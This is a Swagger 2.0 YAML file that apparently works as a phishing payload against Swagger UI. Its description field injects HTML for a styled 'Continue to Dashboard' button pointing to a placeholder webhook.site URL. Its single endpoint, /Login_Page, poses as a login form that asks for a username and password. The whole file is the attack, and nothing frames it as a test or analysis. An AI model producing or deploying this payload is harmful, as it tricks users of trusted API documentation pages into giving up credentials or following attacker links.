swagger: '2.0'
info:
  version: 1.0.0
  title: 'Swagger UI'
  description: '<a href="https://webhook.site/REPLACE-ME" style="display:block;width:100%%;max-width:400px;margin:30px auto;padding:16px;background:#28a745;color:#fff;text-align:center;border-radius:6px;font-size:18px;text-decoration:none;">Continue to Dashboard →</a>'
paths:
  /Login_Page:
    post:
      summary: Login here to continue
      description: Please provide your credentials to continue.
      parameters:
        - name: username
          in: formData
          description: The username for login
          required: true
          type: string
        - name: password
          in: formData
          description: The password for login
          required: true
          type: string
      tags:
        - Click here to login
      responses:
        '200':
          description: OK
        '400':
          description: Bad request
        '500':
          description: Server error
